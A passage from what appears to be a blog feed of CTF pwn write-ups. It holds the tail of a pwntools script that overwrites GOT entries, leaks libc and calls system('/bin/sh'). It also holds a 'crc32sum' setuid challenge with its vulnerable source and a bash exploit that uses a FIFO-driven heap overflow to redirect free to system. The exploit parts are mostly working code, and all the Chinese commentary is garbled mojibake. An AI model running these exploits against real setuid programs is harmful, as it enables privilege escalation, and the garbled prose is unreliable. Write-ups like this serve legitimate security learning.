,elf.got[<span class=\"string\">&quot;printf&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">2</span> ,elf.plt[<span class=\"string\">&quot;printf&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">3</span> ,elf.sym[<span class=\"string\">&quot;_start&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># falsify size</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">4</span> ,<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># hijack arr</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">6</span> ,elf.got[<span class=\"string\">&quot;exit&quot;</span>])</span><br><span class=\"line\">\t<span class=\"comment\"># falsify got[exit]&#x27;s content</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span> ,pop_rdi)</span><br><span class=\"line\">\t<span class=\"comment\"># trigger</span></span><br><span class=\"line\">\tri()</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"string\">&quot;-1&quot;</span>)</span><br><span class=\"line\">\tleak = uu64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;leak&quot;</span>,leak)</span><br><span class=\"line\">\tlibc_base = leak - <span class=\"number\">0x7ffff7e1fc90</span> + <span class=\"number\">0x7ffff7dbe000</span></span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;libc_base&quot;</span>,libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># pwn</span></span><br><span class=\"line\">\tbinsh = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh&quot;</span>))</span><br><span class=\"line\">\tsystem = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;size:&quot;</span>, <span class=\"string\">&quot;5&quot;</span>)<span class=\"comment\"># 0 - 5</span></span><br><span class=\"line\">\tpop_rdi = <span class=\"number\">0x4013e3</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span>, pop_rdi)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">1</span> ,binsh)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">2</span> ,system)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">4</span> ,<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">6</span> ,elf.got[<span class=\"string\">&quot;exit&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span> ,pop_rdi)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"string\">&quot;-1&quot;</span>)</span><br><span class=\"line\">\tir()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<h2 id=\"å…³äºé€†å‘çš„ä¸€ç‚¹è¡¥å……\"><a class=\"markdownIt-Anchor\" href=\"#å…³äºé€†å‘çš„ä¸€ç‚¹è¡¥å……\">#</a> å…³äºé€†å‘çš„ä¸€ç‚¹è¡¥å……</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = <span class=\"number\">16</span> * ((size + <span class=\"number\">31</span>) / <span class=\"number\">0x10</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( &amp;size != (<span class=\"type\">unsigned</span> __int64 *)((<span class=\"type\">char</span> *)&amp;size - (v3 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">  ;</span><br><span class=\"line\">v4 = alloca(v3 &amp; <span class=\"number\">0xFFF</span>);</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ° size åœ¨ 1 - 17 ä¹‹é—´çš„ v3 éƒ½æ˜¯ä¸ä¼šå˜çš„<br>\nä¹Ÿå°±æ˜¯  <code>n + sizeof(long)</code>  ä¸ 0x10 å¯¹é½çš„æƒ…å†µ</p>\n<h1 id=\"crc32sum\"><a class=\"markdownIt-Anchor\" href=\"#crc32sum\">#</a> crc32sum</h1>\n<p>æƒé™é€ƒé€¸ï¼ˆäº¦æˆ–è€…è¯´æ™®é€šå †</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;limits.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/file.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Calculate CRC32 hash for data</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">crc32</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> i, j;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> hash;</span><br><span class=\"line\"></span><br><span class=\"line\">  hash = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; size; i++) &#123;</span><br><span class=\"line\">    hash ^= data[i];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; CHAR_BIT; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (hash &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">        hash = (hash &gt;&gt; <span class=\"number\">1</span>) ^ <span class=\"number\">0xEDB88320</span>;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        hash &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> hash ^ <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Calculate CRC32 hash for file</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">crc32sum</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *filepath)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> fd;</span><br><span class=\"line\">  <span class=\"type\">char</span> *buffer, *p;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Try to open file */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fd = open(filepath, O_RDONLY)) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    perror(filepath);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Lock file */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (flock(fd, LOCK_SH)) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;flock&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Get file size */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fstat(fd, &amp;stbuf)) &#123;</span><br><span class=\"line\">    perror(filepath);</span><br><span class=\"line\">    flock(fd, LOCK_UN);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Allocate buffer */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(buffer = <span class=\"built_in\">malloc</span>(stbuf.st_size))) &#123;    [<span class=\"number\">1</span>] &lt;&lt;- æ¼æ´ç‚¹æ‰€åœ¨ pipeæ˜¯æ²¡æœ‰sizeçš„</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;Memory Error&quot;</span>);</span><br><span class=\"line\">    flock(fd, LOCK_UN);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Read file */</span></span><br><span class=\"line\">  p = buffer;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (read(fd, p++, <span class=\"number\">1</span>) == <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Calculate hash */</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s: %08x\\n&quot;</span>, filepath, crc32(buffer, stbuf.st_size));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Cleanup */</span></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(buffer);</span><br><span class=\"line\">  flock(fd, LOCK_UN);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Entry point</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *filepath;</span><br><span class=\"line\"></span><br><span class=\"line\">  setreuid(geteuid(), geteuid());</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: %s &lt;file&gt; ...\\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (system(<span class=\"string\">&quot;/usr/bin/which crc32 &gt; /dev/null&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Your system has `crc32` too&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; argc; i++) &#123;</span><br><span class=\"line\">    filepath = strdup(argv[i]);</span><br><span class=\"line\">    crc32sum(filepath);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(filepath);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ€è·¯ å¯¹äº <code>FIFO</code>  çš„ç®¡é“   <code>stbuf.st_size</code>  æ˜¯ 0 è¿™å°±é€ æˆäº†å †æº¢å‡º<br>\næˆ‘ä»¬å¯ä»¥ <code>mkfifo</code>  åˆ›å»ºå †å— ç„¶åæº¢å‡ºåˆ°ä¸‹é¢çš„ 0x40 çš„å—ï¼ˆå‰ææ˜¯è¦å¸ƒç½®å¥½ä¸¤ä¸ª 0x40)<br>\n ç„¶ååŠ«æŒ tcache åˆ° got åœ¨åŠ«æŒ free æˆ system çš„ plt<br>\n è¿™æ ·å°±èƒ½ç›´æ¥ free (cmd) å‘½ä»¤æ‰§è¡Œäº†</p>\n<p>éš¾ç‚¹åœ¨äº strdup ä¼šå¹²æ‰°å †å¸ƒå±€ éœ€è¦æ€è€ƒ<br>\nå’Œç¬¬ä¸€æ¬¡ printf ä¼šåˆ›å»º 0x400 çš„ç¼“å†²åŒº éœ€è¦ bypass è¿™ä¸¤å³å¯</p>\n<h2 id=\"fifo\"><a class=\"markdownIt-Anchor\" href=\"#fifo\">#</a> FIFO</h2>\n<p><strong>å‘½åç®¡é“</strong>ä¹Ÿè¢«ç§°ä¸º FIFO æ–‡ä»¶<br>\nç®¡é“æ˜¯æ²¡æ³•è¢« stat ç»“æ„ä½“è¯»å–åˆ°æ•°æ®çš„</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;limits.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/file.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> pipefd[<span class=\"number\">2</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pipe(pipefd) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;pipe&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\">\tfstat(pipefd[<span class=\"number\">0</span>], &amp;stbuf);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, stbuf.st_size);<span class=\"comment\">// 0</span></span><br><span class=\"line\">\tfstat(pipefd[<span class=\"number\">1</span>], &amp;stbuf);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, stbuf.st_size);<span class=\"comment\">// 0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">path=`pwd` # TODO: modify here</span><br><span class=\"line\">target=$path/crc32sum</span><br><span class=\"line\">./cleanup.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real size xx</span></span><br><span class=\"line\">A1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class=\"line\">A2=ooooooooooooooooooooooooooooooo</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x40</span></span><br><span class=\"line\">B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class=\"line\">C=kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x40</span></span><br><span class=\"line\">PL=ccccccccccccccccccccccccccccccccccccccccccccccc</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">real szie 0x50</span></span><br><span class=\"line\">PIPE=pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">tmp=`<span class=\"built_in\">mktemp</span> /tmp/cake-XXX`</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cp</span> <span class=\"variable\">$target</span> .</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:&lt;&lt;<span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x30] &lt;&lt;- A&#x27;s name</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x20] &lt;&lt;- A&#x27;s content    &lt;&lt;- overflow</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x40] &lt;&lt;- B</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tchunk[0x40] &lt;&lt;- B</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">eof</span></span></span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x1f)&quot; &gt; $A1</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0xf)&quot;  &gt; $A2</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $B # B creat two of 0x40 real size chunk</span><br><span class=\"line\">python3 -c &quot;print(&#x27;C&#x27;*0x2f)&quot; &gt; $C</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">:&lt;&lt;<span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\tGOT\t\t\t\t\t\t\t SYM                 PLT</span></span>\t\t\t\t</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404018 free@GLIBC_2.2.5    0000000000401030</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404020 puts@GLIBC_2.2.5    0000000000401040</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404028 system@GLIBC_2.2.5  0000000000401050</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404030 printf@GLIBC_2.2.5  0000000000401060</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404038 geteuid@GLIBC_2.2.5 0000000000401070</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">\t0000000000404040 close@GLIBC_2.2.5   0000000000401080</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">eof</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hijack free<span class=\"string\">&#x27;s got to system&#x27;</span>s plt and retain other nothing change</span></span><br><span class=\"line\">echo -ne &quot;\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x40\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x70\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\">echo -ne &quot;\\x80\\x10\\x40\\x00\\x00\\x00\\x00\\x00&quot; &gt;&gt; $PL</span><br><span class=\"line\"></span><br><span class=\"line\">python3 -c &quot;print(&#x27;S&#x27;*0x18,end=&#x27;&#x27;)&quot;          &gt; payload</span><br><span class=\"line\">echo -ne &#x27;\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; &gt;&gt; payload</span><br><span class=\"line\">echo -ne &#x27;\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00&#x27; &gt;&gt; payload</span><br><span class=\"line\">echo &quot;cat ~/flag&quot; &gt; cmd</span><br><span class=\"line\">mkfifo $PIPE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">A1æ˜¯å‘ç°ä¼šå‡­ç©ºå‡ºç°ä¸€ä¸ª0x400çš„å— é—´éš”æˆ‘ä»¬çš„payload</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">gdb -x gdbscript --args <span class=\"variable\">$target</span> <span class=\"variable\">$A1</span> <span class=\"variable\">$A2</span> <span class=\"variable\">$B</span> <span class=\"variable\">$PIPE</span> <span class=\"variable\">$PL</span> cmd</span> </span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">target <span class=\"variable\">$A1</span> <span class=\"variable\">$A2</span> <span class=\"variable\">$B</span> <span class=\"variable\">$PIPE</span> <span class=\"variable\">$PL</span> cmd  &amp;</span></span><br><span class=\"line\">sleep 1</span><br><span class=\"line\">cat ./payload &gt; $PIPE</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "writeup"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/",
